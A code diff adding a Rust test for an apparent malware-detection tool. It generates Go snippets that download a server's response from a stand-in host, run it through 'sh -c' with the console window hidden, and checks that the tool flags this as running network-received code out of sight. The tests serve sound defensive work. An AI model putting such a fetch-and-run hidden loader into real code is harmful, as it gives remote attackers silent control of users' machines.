@@ -123,6 +123,27 @@ fn a_download_written_made_executable_and_run() {
 }
 
 #[test]
+fn code_received_and_run_out_of_sight_says_so() {
+    // GR-8's follow-up: what a server sends, handed to a shell started with its window hidden or with no console
+    let body = |attr: &str| {
+        format!(
+            "\tresp, err := http.Get(\"https://example.invalid/c\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
+             \tb, _ := io.ReadAll(resp.Body)\n\tcmd := exec.Command(\"sh\", \"-c\", string(b))\n{}\tcmd.Start()\n",
+            attr
+        )
+    };
+    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"syscall\"";
+    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
+                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
+        let a = init(&body(attr), imports);
+        assert!(has(&start(&a), "runs code it receives over the network, out of sight"), "{:?}", start(&a));
+    }
+    let a = init(&body(""), imports);
+    let r = start(&a);
+    assert!(has(&r, "runs code it receives over the network") && !has(&r, "out of sight"), "{:?}", r);
+}
+
+#[test]
 fn a_download_run_out_of_sight_says_so() {
     // GR-8: a payload downloaded, then started with its window hidden or with no console (evm-units' shape)
     let body = |attr: &str| {
